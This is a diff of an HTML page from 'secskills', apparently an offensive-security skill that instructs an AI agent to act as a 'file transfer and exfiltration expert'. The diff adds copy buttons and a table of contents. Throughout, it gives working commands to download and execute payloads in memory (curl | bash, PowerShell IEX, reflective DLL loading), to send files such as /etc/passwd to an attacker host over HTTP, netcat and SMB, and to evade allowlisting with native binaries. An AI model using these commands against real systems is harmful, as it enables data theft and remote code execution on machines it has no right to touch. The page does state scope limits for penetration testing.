@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Transfer files between systems using HTTP, SMB, FTP, netcat, base64 encoding, and living-off-the-land techniques for both Linux and Windows. Use when moving tools or exfiltrating data.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>You are a file transfer and exfiltration expert. Use this skill when the user requests help with:</p>
+<div class="wrap slayout"><article><p>You are a file transfer and exfiltration expert. Use this skill when the user requests help with:</p>
 <ul>
 <li>Transferring files between systems</li>
 <li>Data exfiltration techniques</li>
@@ -49,7 +61,7 @@
 <li>Bypassing egress filtering</li>
 <li>Establishing file servers</li>
 </ul>
-<h2>When to Use</h2>
+<h2 id="when-to-use">When to Use</h2>
 <p>Activate this skill when the user asks to:</p>
 <ul>
 <li>Transfer files between systems</li>
@@ -61,7 +73,7 @@
 <li>Encode or obfuscate file transfers</li>
 <li>Help with data staging</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Before you have code execution</strong> — use the relevant initial access skill</li>
 <li><strong>Exfiltrating real customer data</strong> — outside authorized scope; demonstrate</li>
@@ -70,10 +82,10 @@
 <ul>
 <li><strong>Detecting exfiltration as a defender</strong> — use <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></li>
 </ul>
-<h2>Core Methodologies</h2>
+<h2 id="core-methodologies">Core Methodologies</h2>
 <h3>1. Linux File Download</h3>
 <p><strong>wget:</strong></p>
-<pre><code># Basic download
+<div class="codeblk cx"><button class="copy" data-copy="# Basic download
 wget http://10.10.10.10/file.txt
 
 # Save with different name
@@ -83,9 +95,19 @@ wget http://10.10.10.10/file.txt -O output.txt
 wget -r http://10.10.10.10/directory/
 
 # Download in background
-wget -b http://10.10.10.10/largefile.zip</code></pre>
+wget -b http://10.10.10.10/largefile.zip">copy</button><pre><code># Basic download
+wget http://10.10.10.10/file.txt
+
+# Save with different name
+wget http://10.10.10.10/file.txt -O output.txt
+
+# Recursive download
+wget -r http://10.10.10.10/directory/
+
+# Download in background
+wget -b http://10.10.10.10/largefile.zip</code></pre></div>
 <p><strong>curl:</strong></p>
-<pre><code># Basic download
+<div class="codeblk cx"><button class="copy" data-copy="# Basic download
 curl http://10.10.10.10/file.txt -o file.txt
 curl -O http://10.10.10.10/file.txt  # Keep original name
 
@@ -96,9 +118,20 @@ curl -L http://10.10.10.10/file.txt -o file.txt
 curl -u user:password http://10.10.10.10/file.txt -o file.txt
 
 # Download multiple files
-curl -O http://10.10.10.10/file[1-10].txt</code></pre>
+curl -O http://10.10.10.10/file[1-10].txt">copy</button><pre><code># Basic download
+curl http://10.10.10.10/file.txt -o file.txt
+curl -O http://10.10.10.10/file.txt  # Keep original name
+
+# Follow redirects
+curl -L http://10.10.10.10/file.txt -o file.txt
+
+# Download with auth
+curl -u user:password http://10.10.10.10/file.txt -o file.txt
+
+# Download multiple files
+curl -O http://10.10.10.10/file[1-10].txt</code></pre></div>
 <p><strong>Netcat:</strong></p>
-<pre><code># Receiver
+<div class="codeblk cx"><button class="copy" data-copy="# Receiver
 nc -lvnp 4444 &gt; file.txt
 
 # Sender
@@ -106,9 +139,25 @@ nc 10.10.10.10 4444 &lt; file.txt
 
 # With progress (use pv)
 nc -lvnp 4444 | pv &gt; file.txt
-pv file.txt | nc 10.10.10.10 4444</code></pre>
+pv file.txt | nc 10.10.10.10 4444">copy</button><pre><code># Receiver
+nc -lvnp 4444 &gt; file.txt
+
+# Sender
+nc 10.10.10.10 4444 &lt; file.txt
+
+# With progress (use pv)
+nc -lvnp 4444 | pv &gt; file.txt
+pv file.txt | nc 10.10.10.10 4444</code></pre></div>
 <p><strong>Base64 Encoding (for copy-paste):</strong></p>
-<pre><code># Encode on attacker machine
+<div class="codeblk cx"><button class="copy" data-copy="# Encode on attacker machine
+base64 file.txt &gt; file.b64
+cat file.b64  # Copy this
+
+# Decode on target
+echo &quot;BASE64_STRING_HERE&quot; | base64 -d &gt; file.txt
+
+# Or in one command
+echo &quot;BASE64STRING&quot; | base64 -d &gt; file.txt">copy</button><pre><code># Encode on attacker machine
 base64 file.txt &gt; file.b64
 cat file.b64  # Copy this
 
@@ -116,9 +165,9 @@ cat file.b64  # Copy this
 echo "BASE64_STRING_HERE" | base64 -d &gt; file.txt
 
 # Or in one command
-echo "BASE64STRING" | base64 -d &gt; file.txt</code></pre>
+echo "BASE64STRING" | base64 -d &gt; file.txt</code></pre></div>
 <p><strong>Python HTTP Server (for hosting files):</strong></p>
-<pre><code># Python 3
+<div class="codeblk cx"><button class="copy" data-copy="# Python 3
 python3 -m http.server 8000
 
 # Python 2
@@ -128,10 +177,32 @@ python -m SimpleHTTPServer 8000
 ruby -run -e httpd . -p 8000
 
 # PHP
-php -S 0.0.0.0:8000</code></pre>
+php -S 0.0.0.0:8000">copy</button><pre><code># Python 3
+python3 -m http.server 8000
+
+# Python 2
+python -m SimpleHTTPServer 8000
+
+# Ruby
+ruby -run -e httpd . -p 8000
+
+# PHP
+php -S 0.0.0.0:8000</code></pre></div>
 <h3>2. Windows File Download</h3>
 <p><strong>PowerShell:</strong></p>
-<pre><code># Invoke-WebRequest (PS 3.0+)
+<div class="codeblk cx"><button class="copy" data-copy="# Invoke-WebRequest (PS 3.0+)
+Invoke-WebRequest -Uri &quot;http://10.10.10.10/file.exe&quot; -OutFile &quot;C:\Temp\file.exe&quot;
+iwr -Uri &quot;http://10.10.10.10/file.exe&quot; -OutFile &quot;C:\Temp\file.exe&quot;
+
+# DownloadFile
+(New-Object Net.WebClient).DownloadFile(&quot;http://10.10.10.10/file.exe&quot;, &quot;C:\Temp\file.exe&quot;)
+
+# DownloadString (download and execute)
+IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.10.10/script.ps1&#x27;)
+
+# Download and execute in memory
+$data = (New-Object Net.WebClient).DownloadData(&#x27;http://10.10.10.10/payload.exe&#x27;)
+$assem = [System.Reflection.Assembly]::Load($data)">copy</button><pre><code># Invoke-WebRequest (PS 3.0+)
 Invoke-WebRequest -Uri "http://10.10.10.10/file.exe" -OutFile "C:\Temp\file.exe"
 iwr -Uri "http://10.10.10.10/file.exe" -OutFile "C:\Temp\file.exe"
 
@@ -143,35 +214,53 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')
 
 # Download and execute in memory
 $data = (New-Object Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
-$assem = [System.Reflection.Assembly]::Load($data)</code></pre>
+$assem = [System.Reflection.Assembly]::Load($data)</code></pre></div>
 <p><strong>certutil:</strong></p>
-<pre><code># Download file
+<div class="codeblk cx"><button class="copy" data-copy="# Download file
+certutil.exe -urlcache -split -f &quot;http://10.10.10.10/file.exe&quot; file.exe
+
+# Alternative syntax
+certutil -urlcache -f &quot;http://10.10.10.10/file.exe&quot; file.exe
+
+# Clean cache
+certutil.exe -urlcache * delete">copy</button><pre><code># Download file
 certutil.exe -urlcache -split -f "http://10.10.10.10/file.exe" file.exe
 
 # Alternative syntax
 certutil -urlcache -f "http://10.10.10.10/file.exe" file.exe
 
 # Clean cache
-certutil.exe -urlcache * delete</code></pre>
+certutil.exe -urlcache * delete</code></pre></div>
 <p><strong>bitsadmin:</strong></p>
-<pre><code># Download file
+<div class="codeblk cx"><button class="copy" data-copy="# Download file
 bitsadmin /transfer job /download /priority high http://10.10.10.10/file.exe C:\Temp\file.exe
 
 # Verify and complete
-bitsadmin /complete job</code></pre>
+bitsadmin /complete job">copy</button><pre><code># Download file
+bitsadmin /transfer job /download /priority high http://10.10.10.10/file.exe C:\Temp\file.exe
+
+# Verify and complete
+bitsadmin /complete job</code></pre></div>
 <p><strong>cmd.exe (VBS script):</strong> when PowerShell/certutil/bitsadmin are unavailable, build a WinHTTP downloader from <code>cmd.exe</code>. See <a href="references/command-catalogs.md#windows-cmdexe-vbs-downloader">references/command-catalogs.md</a>.</p>
 <h3>3. Linux File Upload/Exfiltration</h3>
 <p><strong>HTTP POST:</strong></p>
-<pre><code># curl
+<div class="codeblk cx"><button class="copy" data-copy="# curl
+curl -X POST -F &quot;file=@/etc/passwd&quot; http://10.10.10.10:8000/upload
+
+# With auth
+curl -X POST -F &quot;file=@file.txt&quot; http://10.10.10.10:8000/upload -u user:pass
+
+# wget
+wget --post-file=/etc/passwd http://10.10.10.10:8000/upload">copy</button><pre><code># curl
 curl -X POST -F "file=@/etc/passwd" http://10.10.10.10:8000/upload
 
 # With auth
 curl -X POST -F "file=@file.txt" http://10.10.10.10:8000/upload -u user:pass
 
 # wget
-wget --post-file=/etc/passwd http://10.10.10.10:8000/upload</code></pre>
+wget --post-file=/etc/passwd http://10.10.10.10:8000/upload</code></pre></div>
 <p><strong>SCP (if SSH available):</strong></p>
-<pre><code># Upload
+<div class="codeblk cx"><button class="copy" data-copy="# Upload
 scp file.txt user@10.10.10.10:/tmp/
 
 # Download
@@ -181,38 +270,67 @@ scp user@10.10.10.10:/tmp/file.txt ./
 scp -r directory/ user@10.10.10.10:/tmp/
 
 # With key
-scp -i id_rsa file.txt user@10.10.10.10:/tmp/</code></pre>
+scp -i id_rsa file.txt user@10.10.10.10:/tmp/">copy</button><pre><code># Upload
+scp file.txt user@10.10.10.10:/tmp/
+
+# Download
+scp user@10.10.10.10:/tmp/file.txt ./
+
+# Recursive
+scp -r directory/ user@10.10.10.10:/tmp/
+
+# With key
+scp -i id_rsa file.txt user@10.10.10.10:/tmp/</code></pre></div>
 <p><strong>Netcat:</strong></p>
-<pre><code># Receiver (attacker)
+<div class="codeblk cx"><button class="copy" data-copy="# Receiver (attacker)
 nc -lvnp 4444 &gt; received_file.txt
 
 # Sender (target)
-nc 10.10.10.10 4444 &lt; file.txt</code></pre>
+nc 10.10.10.10 4444 &lt; file.txt">copy</button><pre><code># Receiver (attacker)
+nc -lvnp 4444 &gt; received_file.txt
+
+# Sender (target)
+nc 10.10.10.10 4444 &lt; file.txt</code></pre></div>
 <p><strong>Socat:</strong></p>
-<pre><code># Receiver
+<div class="codeblk cx"><button class="copy" data-copy="# Receiver
 socat TCP4-LISTEN:4444,fork file:received.txt
 
 # Sender
-socat TCP4:10.10.10.10:4444 file:file.txt</code></pre>
+socat TCP4:10.10.10.10:4444 file:file.txt">copy</button><pre><code># Receiver
+socat TCP4-LISTEN:4444,fork file:received.txt
+
+# Sender
+socat TCP4:10.10.10.10:4444 file:file.txt</code></pre></div>
 <p><strong>Covert channels (DNS / ICMP):</strong> when normal egress is filtered, tunnel data out over DNS queries or ICMP packets. See <a href="references/command-catalogs.md#dns-exfiltration">references/command-catalogs.md</a>.</p>
 <h3>4. Windows File Upload</h3>
 <p><strong>PowerShell:</strong></p>
-<pre><code># Upload via HTTP POST
+<div class="codeblk cx"><button class="copy" data-copy="# Upload via HTTP POST
+$file = Get-Content &quot;C:\Temp\file.txt&quot; -Raw
+Invoke-RestMethod -Uri &quot;http://10.10.10.10:8000/upload&quot; -Method Post -Body $file
+
+# Upload file object
+$fileBytes = [System.IO.File]::ReadAllBytes(&quot;C:\Temp\file.exe&quot;)
+Invoke-RestMethod -Uri &quot;http://10.10.10.10:8000/upload&quot; -Method Post -Body $fileBytes">copy</button><pre><code># Upload via HTTP POST
 $file = Get-Content "C:\Temp\file.txt" -Raw
 Invoke-RestMethod -Uri "http://10.10.10.10:8000/upload" -Method Post -Body $file
 
 # Upload file object
 $fileBytes = [System.IO.File]::ReadAllBytes("C:\Temp\file.exe")
-Invoke-RestMethod -Uri "http://10.10.10.10:8000/upload" -Method Post -Body $fileBytes</code></pre>
+Invoke-RestMethod -Uri "http://10.10.10.10:8000/upload" -Method Post -Body $fileBytes</code></pre></div>
 <p><strong>SMB:</strong></p>
-<pre><code># Copy to SMB share
+<div class="codeblk cx"><button class="copy" data-copy="# Copy to SMB share
 copy C:\Temp\file.txt \\10.10.10.10\share\
 
 # Map drive first
 net use Z: \\10.10.10.10\share
-copy C:\Temp\file.txt Z:\</code></pre>
+copy C:\Temp\file.txt Z:\">copy</button><pre><code># Copy to SMB share
+copy C:\Temp\file.txt \\10.10.10.10\share\
+
+# Map drive first
+net use Z: \\10.10.10.10\share
+copy C:\Temp\file.txt Z:\</code></pre></div>
 <p><strong>FTP:</strong></p>
-<pre><code># Create FTP script
+<div class="codeblk cx"><button class="copy" data-copy="# Create FTP script
 echo open 10.10.10.10 &gt; ftp.txt
 echo user username password &gt;&gt; ftp.txt
 echo binary &gt;&gt; ftp.txt
@@ -220,10 +338,18 @@ echo put file.exe &gt;&gt; ftp.txt
 echo bye &gt;&gt; ftp.txt
 
 # Execute
-ftp -s:ftp.txt</code></pre>
+ftp -s:ftp.txt">copy</button><pre><code># Create FTP script
+echo open 10.10.10.10 &gt; ftp.txt
+echo user username password &gt;&gt; ftp.txt
+echo binary &gt;&gt; ftp.txt
+echo put file.exe &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+
+# Execute
+ftp -s:ftp.txt</code></pre></div>
 <h3>5. SMB File Transfer</h3>
 <p><strong>Linux to Windows:</strong></p>
-<pre><code># Mount SMB share on Linux
+<div class="codeblk cx"><button class="copy" data-copy="# Mount SMB share on Linux
 smbclient //10.10.10.10/share -U username
 # In smbclient:
 put local_file.txt
@@ -231,15 +357,27 @@ get remote_file.txt
 
 # Mount and copy
 mount -t cifs //10.10.10.10/share /mnt/smb -o username=user,password=pass
-cp file.txt /mnt/smb/</code></pre>
+cp file.txt /mnt/smb/">copy</button><pre><code># Mount SMB share on Linux
+smbclient //10.10.10.10/share -U username
+# In smbclient:
+put local_file.txt
+get remote_file.txt
+
+# Mount and copy
+mount -t cifs //10.10.10.10/share /mnt/smb -o username=user,password=pass
+cp file.txt /mnt/smb/</code></pre></div>
 <p><strong>Windows to Linux:</strong></p>
-<pre><code># Start Samba server on Linux
+<div class="codeblk cx"><button class="copy" data-copy="# Start Samba server on Linux
 sudo smbserver.py share /tmp/share -smb2support
 
 # From Windows
-copy C:\file.txt \\10.10.10.10\share\</code></pre>
+copy C:\file.txt \\10.10.10.10\share\">copy</button><pre><code># Start Samba server on Linux
+sudo smbserver.py share /tmp/share -smb2support
+
+# From Windows
+copy C:\file.txt \\10.10.10.10\share\</code></pre></div>
 <p><strong>Impacket smbserver:</strong></p>
-<pre><code># On attacker (Linux)
+<div class="codeblk cx"><button class="copy" data-copy="# On attacker (Linux)
 sudo impacket-smbserver share /tmp/share -smb2support
 sudo impacket-smbserver share /tmp/share -smb2support -username user -password pass
 
@@ -250,16 +388,31 @@ copy file.txt \\10.10.10.10\share\
 
 # With auth
 net use \\10.10.10.10\share /user:user pass
-copy file.txt \\10.10.10.10\share\</code></pre>
+copy file.txt \\10.10.10.10\share\">copy</button><pre><code># On attacker (Linux)
+sudo impacket-smbserver share /tmp/share -smb2support
+sudo impacket-smbserver share /tmp/share -smb2support -username user -password pass
+
+# On target (Windows)
+# No auth
+copy file.txt \\10.10.10.10\share\
+\\10.10.10.10\share\file.exe
+
+# With auth
+net use \\10.10.10.10\share /user:user pass
+copy file.txt \\10.10.10.10\share\</code></pre></div>
 <h3>6. FTP File Transfer</h3>
 <p><strong>Linux FTP Server:</strong></p>
-<pre><code># Python pyftpdlib
+<div class="codeblk cx"><button class="copy" data-copy="# Python pyftpdlib
 sudo python3 -m pyftpdlib -p 21 -w
 
 # vsftpd (if installed)
-sudo service vsftpd start</code></pre>
+sudo service vsftpd start">copy</button><pre><code># Python pyftpdlib
+sudo python3 -m pyftpdlib -p 21 -w
+
+# vsftpd (if installed)
+sudo service vsftpd start</code></pre></div>
 <p><strong>Windows FTP Client:</strong></p>
-<pre><code># Interactive
+<div class="codeblk cx"><button class="copy" data-copy="# Interactive
 ftp 10.10.10.10
 
 # Scripted
@@ -269,7 +422,17 @@ echo password &gt;&gt; ftp.txt
 echo binary &gt;&gt; ftp.txt
 echo GET file.exe &gt;&gt; ftp.txt
 echo bye &gt;&gt; ftp.txt
-ftp -s:ftp.txt</code></pre>
+ftp -s:ftp.txt">copy</button><pre><code># Interactive
+ftp 10.10.10.10
+
+# Scripted
+echo open 10.10.10.10 21 &gt; ftp.txt
+echo USER username &gt;&gt; ftp.txt
+echo password &gt;&gt; ftp.txt
+echo binary &gt;&gt; ftp.txt
+echo GET file.exe &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+ftp -s:ftp.txt</code></pre></div>
 <h3>7. Living Off The Land (LOLBAS/GTFOBins)</h3>
 <p>Prefer signed, native binaries (certutil, mshta, regsvr32, rundll32 on Windows; GTFOBins entries on Linux) to blend in and evade allowlisting. Full command catalog: <a href="references/command-catalogs.md#living-off-the-land-lolbasgtfobins">references/command-catalogs.md</a>.</p>
 <h3>8. Database Exfiltration</h3>
@@ -278,42 +441,63 @@ ftp -s:ftp.txt</code></pre>
 <p>Encode before transfer to survive lossy channels and evade content inspection: base64 for copy-paste, hex for binary-safe transport, gzip/tar to compress and bundle. Command catalog: <a href="references/command-catalogs.md#encoding--obfuscation">references/command-catalogs.md</a>.</p>
 <h3>10. Persistence and Staging</h3>
 <p><strong>Download and Execute:</strong></p>
-<pre><code># Linux
+<div class="codeblk cx"><button class="copy" data-copy="# Linux
 wget http://10.10.10.10/script.sh -O /tmp/script.sh &amp;&amp; chmod +x /tmp/script.sh &amp;&amp; /tmp/script.sh
 
 # One-liner
 curl http://10.10.10.10/script.sh | bash
 
 # PowerShell
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"</code></pre>
+powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.10.10/script.ps1&#x27;)&quot;">copy</button><pre><code># Linux
+wget http://10.10.10.10/script.sh -O /tmp/script.sh &amp;&amp; chmod +x /tmp/script.sh &amp;&amp; /tmp/script.sh
+
+# One-liner
+curl http://10.10.10.10/script.sh | bash
+
+# PowerShell
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"</code></pre></div>
 <p><strong>In-Memory Execution:</strong></p>
-<pre><code># PowerShell - never touches disk
+<div class="codeblk cx"><button class="copy" data-copy="# PowerShell - never touches disk
+$code = (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.10.10/script.ps1&#x27;)
+IEX $code
+
+# Reflective DLL loading
+$bytes = (New-Object Net.WebClient).DownloadData(&#x27;http://10.10.10.10/payload.dll&#x27;)
+[System.Reflection.Assembly]::Load($bytes)">copy</button><pre><code># PowerShell - never touches disk
 $code = (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')
 IEX $code
 
 # Reflective DLL loading
 $bytes = (New-Object Net.WebClient).DownloadData('http://10.10.10.10/payload.dll')
-[System.Reflection.Assembly]::Load($bytes)</code></pre>
-<h2>Quick Reference Commands</h2>
+[System.Reflection.Assembly]::Load($bytes)</code></pre></div>
+<h2 id="quick-reference-commands">Quick Reference Commands</h2>
 <p><strong>Start HTTP Server (Attacker):</strong></p>
-<pre><code>python3 -m http.server 8000
-sudo python3 -m http.server 80</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="python3 -m http.server 8000
+sudo python3 -m http.server 80">copy</button><pre><code>python3 -m http.server 8000
+sudo python3 -m http.server 80</code></pre></div>
 <p><strong>Start SMB Server (Attacker):</strong></p>
-<pre><code>sudo impacket-smbserver share /tmp/share -smb2support</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="sudo impacket-smbserver share /tmp/share -smb2support">copy</button><pre><code>sudo impacket-smbserver share /tmp/share -smb2support</code></pre></div>
 <p><strong>Download on Target (Linux):</strong></p>
-<pre><code>wget http://10.10.10.10:8000/file
-curl http://10.10.10.10:8000/file -o file</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="wget http://10.10.10.10:8000/file
+curl http://10.10.10.10:8000/file -o file">copy</button><pre><code>wget http://10.10.10.10:8000/file
+curl http://10.10.10.10:8000/file -o file</code></pre></div>
 <p><strong>Download on Target (Windows):</strong></p>
-<pre><code>certutil -urlcache -f http://10.10.10.10:8000/file.exe file.exe
-powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10:8000/file.exe','file.exe')"</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="certutil -urlcache -f http://10.10.10.10:8000/file.exe file.exe
+powershell -c &quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://10.10.10.10:8000/file.exe&#x27;,&#x27;file.exe&#x27;)&quot;">copy</button><pre><code>certutil -urlcache -f http://10.10.10.10:8000/file.exe file.exe
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10:8000/file.exe','file.exe')"</code></pre></div>
 <p><strong>Upload from Target:</strong></p>
-<pre><code># Linux
+<div class="codeblk cx"><button class="copy" data-copy="# Linux
+curl -X POST -F &quot;file=@file.txt&quot; http://10.10.10.10:8000/
+nc 10.10.10.10 4444 &lt; file.txt
+
+# Windows
+copy file.txt \\10.10.10.10\share\">copy</button><pre><code># Linux
 curl -X POST -F "file=@file.txt" http://10.10.10.10:8000/
 nc 10.10.10.10 4444 &lt; file.txt
 
 # Windows
-copy file.txt \\10.10.10.10\share\</code></pre>
-<h2>Troubleshooting</h2>
+copy file.txt \\10.10.10.10\share\</code></pre></div>
+<h2 id="troubleshooting">Troubleshooting</h2>
 <p><strong>Firewall Blocking:</strong></p>
 <ul>
 <li>Try alternative ports (80, 443, 53)</li>
@@ -334,19 +518,19 @@ copy file.txt \\10.10.10.10\share\</code></pre>
 <li>Use database OUT FILE if database access</li>
 <li>Use local services (FTP, HTTP on internal network)</li>
 </ul>
-<h2>Reference Links</h2>
+<h2 id="reference-links">Reference Links</h2>
 <ul>
 <li>LOLBAS Project: https://lolbas-project.github.io/</li>
 <li>GTFOBins: https://gtfobins.github.io/</li>
 <li>HackTricks File Transfer: https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration</li>
 <li>PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/File%20Transfer.md</li>
 </ul>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a href="references/command-catalogs.md">references/command-catalogs.md</a> — full</li>
 </ul>
 <p>copy-paste command dumps for the Windows VBS downloader, DNS/ICMP covert channels, LOLBAS/GTFOBins, database exfiltration, and encoding/obfuscation.</p>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Resource Development</strong> (TA0042)</p>
 <ul>
@@ -375,5 +559,8 @@ copy file.txt \\10.10.10.10\share\</code></pre>
 <li><a href="https://attack.mitre.org/techniques/T1048/">T1048</a> Exfiltration Over Alternative Protocol — see also <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>, <a class="xref" href="analyzing-network-traffic.html"><code>analyzing-network-traffic</code></a></li>
 <li><a href="https://attack.mitre.org/techniques/T1567/">T1567</a> Exfiltration Over Web Service — see also <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></li>
 </ul>
-<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#core-methodologies">Core Methodologies</a><a href="#quick-reference-commands">Quick Reference Commands</a><a href="#troubleshooting">Troubleshooting</a><a href="#reference-links">Reference Links</a><a href="#references">References</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
